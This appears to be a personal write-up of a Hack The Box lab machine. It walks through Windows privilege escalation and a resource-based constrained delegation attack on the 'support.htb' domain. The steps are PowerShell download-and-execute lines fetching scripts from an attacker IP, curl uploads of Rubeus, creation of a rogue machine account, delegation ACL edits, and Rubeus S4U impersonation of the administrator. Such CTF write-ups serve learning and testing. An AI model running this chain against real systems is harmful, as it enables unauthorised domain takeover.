We have 3 privilege that will see if we can escalate via them or not  

```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3:8080/Sherlock.ps1') | powershell -noprofile -
```


```
ModifiablePath    : C:\Users\support\AppData\Local\Microsoft\WindowsApps
IdentityReference : SUPPORT\support
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\support\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\support\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath
                    'C:\Users\support\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```
![[Pasted image 20231121233510.png]]


```

```

![[Pasted image 20231122110410.png]]

![[Pasted image 20231122110739.png]]

Will try to expose Generic All 
Bydefault Windows any Domain Users can create upto 10 machine 
Kerberos relay attack can happened but was patched.

Will have to download a few dependencies for it
![[Pasted image 20231122112507.png]]
Powermad.ps1
https://github.com/Kevin-Robertson/Powermad.git

PowerSploit Dev branch (i.e. -b dev) 
https://github.com/PowerShellMafia/PowerSploit

Sharpcollection
https://github.com/Flangvik/SharpCollection

Will use the Curl command to upload these to victims machine
```
curl 10.10.16.3:8080/Rubeus.exe -o Rubeus.exe
```

Another way to upload if curl don't work
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8080/Powermad.ps1')
```
![[Pasted image 20231122112828.png]]

Let's see if we can make new machines or not
```
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```

So let's abuse the all generic feature
```
New-MachineAccount -MachineAccount testing -Password $(ConvertTo-SecureString 'testing2023!' -AsPlainText -Force)
```
![[Pasted image 20231122113650.png]]

```
$ComputerSid = Get-DomainComputer testing -Properties objectsid | Select -Expand objectsid

S-1-5-21-1677581083-3380853377-188903654-5101
```

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer testing | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```


```
[*] Input password             : testing2023!
[*]       rc4_hmac             : 44903706DB895D7464D295E2FD7FC639
```
![[Pasted image 20231122114356.png]]

Now will perform behind similar of impersonation attack (i.e. S4u Active Directory service of user)

We got this error
![[Pasted image 20231122121317.png]]
Let's rerun the command as it is

So this command was the culprit bit will run all the command.
![[Pasted image 20231122121909.png]]
```
Get-DomainComputer $TargetComputer
```
![[Pasted image 20231122122115.png]]

It is taking all the computer in the target system that's why the error might be 


```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Rubeus.exe hash /password:Summer2018!

Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt


```

```
[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
```

We got the ticket successfully this time
![[Pasted image 20231122122419.png]]

So what we have done is that we will impersonate administrator and sign ticket on there behalf and if thing work as plan we can simply pysecex.py with this kerbros ticket.

